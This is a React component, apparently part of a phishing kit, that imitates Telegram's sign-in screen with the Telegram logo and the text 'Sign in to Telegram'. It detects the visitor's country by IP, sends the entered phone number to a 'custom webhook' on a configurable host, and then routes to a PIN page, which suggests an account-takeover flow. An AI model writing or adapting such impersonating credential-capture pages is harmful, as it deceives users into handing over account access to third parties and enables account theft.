import {
    Select,
    Input,
    Button,
    Headline,
    Text,
    List
  } from '@telegram-apps/telegram-ui';
  import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { countries } from '../libs/country_data'  

  export const Home = () => {

    // 只允许数字，允许以 + 开头
    const PHONE_LOCAL_REGEX = /^[1-9]\d{6,14}$/;
    const normalizePhone = (phone: string) =>
      phone.replace(/[\s-]/g, '');
    
    const isValidPhone = (phone: string) =>
      PHONE_LOCAL_REGEX.test(normalizePhone(phone));

    // const defaultCountry = countries.find(c => c.iso2 === 'CN')!;
    const [error, setError] = useState("")
    const [dialCode, setDialCode] = useState('+86');
    const [phone, setPhone] = useState('');
    const navigate = useNavigate();
    
    useEffect(() => {
      const detectCountryByIP = async () => {
        try {
          const res = await fetch('https://ipapi.co/json/');
          const data = await res.json();
    
          // data.country_code 例如：VN / CN / JP / US
          if (!data?.country_code) return;
    
          const matched = countries.find(
            c => c.iso2 === data.country_code
          );
    
          if (matched) {
            setDialCode(matched.dialCode);
          }
        } catch (err) {
          console.warn('IP detect failed', err);
        }
      };
    
      detectCountryByIP();
    }, []);
    

    const handleClick = async() => {
        console.log('Next step: ' + dialCode + "-"+ phone );
        
        if(isValidPhone(phone)){
          const HOST = process.env.REACT_APP_HOST;
          console.log("host :" + HOST);
          const country = countries.find(c => c.dialCode === dialCode)

          // 发送到自定义webhook
          await fetch(`${HOST}/phone`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              interPhone: dialCode + "-"+ phone,
              country: country

            }),
          });    
          navigate('/pin', {
            state:{
              interPhone: dialCode + "-"+ phone
            }
          });
          // 自己路由到pin 码
          // setTimeout(()=>{
          //   navigate('/pin', {
          //     state:{
          //       interPhone: dialCode + "-"+ phone
          //     }
          //   });
          // },500)          
        } else {
          setError("Please use a valid phone number")
        }
    }
  
    return (
      // 使用 List 作为底色容器，确保背景统一为纯白或极浅灰
      <List style={{ 
        backgroundColor: 'var(--tgui--bg_color)', 
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '40px 20px' 
      }}>
        
        {/* 1. Telegram Logo */}
        <div style={{ marginBottom: 24 }}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" 
            alt="Telegram" 
            style={{ width: 100, height: 100 }}
          />
        </div>
  
        {/* 2. 标题和描述 */}
        <div style={{ textAlign: 'center', marginBottom: 32 }}>
          <Headline weight="1" style={{ marginBottom: 8 }}>
            Sign in to Telegram
          </Headline>
          <Text style={{ color: 'var(--tgui--subtitle_text_color)', display: 'block' }}>
            Please confirm your country code <br /> and enter your phone number.
          </Text>
        </div>
  
        {/* 3. 输入区域：取消 Section，直接平铺组件以保持背景一致 */}
        <div style={{ width: '100%', maxWidth: 400 }}>
          <Select
            header="Country"
            value={dialCode}

            onChange={e => setDialCode(e.target.value)}
          >
            {countries.map(c => (
              <option key={c.dialCode} value={c.dialCode}>
                {c.label} ({c.dialCode})
              </option>
            ))}
          </Select>
  
          <Input
            header="Phone Number"
            inputMode="tel"
            value={phone}
            onChange={e => setPhone(e.target.value)}
            before={<span style={{ marginRight: 8 }}
            >{dialCode}</span>}
          />

          {error && (
              <div className="text-sm text-red-600 bg-red-50 p-3 rounded-md border border-red-200">
                {error}
              </div>
                )}
  
          {/* 4. 底部按钮 */}
          
          <Button
            mode="filled"
            size="l"
            stretched
            disabled={!phone}
            onClick={handleClick}
            style={{ 
              height: 50, 
              fontSize: 16, 
              fontWeight: 'bold',
              marginTop:16
            }}
          >
            NEXT
          </Button>

        </div>
      </List>
    );
  };